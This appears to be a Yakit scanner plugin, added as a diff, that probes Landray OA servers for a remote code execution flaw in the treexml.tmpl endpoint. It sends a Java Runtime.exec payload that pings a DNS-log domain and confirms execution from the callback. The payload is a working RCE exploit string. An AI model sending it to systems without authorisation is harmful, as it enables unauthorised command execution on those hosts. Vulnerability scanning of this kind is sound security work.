@@ -1,0 +1,121 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+
+
+
+Packet = `POST /data/sys-common/treexml.tmpl HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+{{params(payload)}}`
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+addDynRule = func(payloadGenerator,riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "isDyn":true,
+        "packet": Packet,
+        "payloadGenerator": payloadGenerator,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+//添加动态规则
+addDynRule(()=>{
+    server, token, dnserr = risk.NewDNSLogDomain()
+    payload = str.f(`s_bean=ruleFormulaValidate&script=try {String cmd = "ping -c 2 %s";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}`, server)
+    checker = (rsp,header,body)=>{
+        sleep(5)
+        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
+        if len(dnsdata) > 0 {
+            return true
+        }
+        return false
+    }
+    return payload,checker
+},"RCE","landray-oa-treexml-rce","critical","https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce")
+
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+        println("start")
+        if rule.isDyn{
+            println("dyn")
+            rule["payload"],rule["check"] = rule.payloadGenerator()
+        }
+        dump(rule["payload"])
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+
+    // 漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
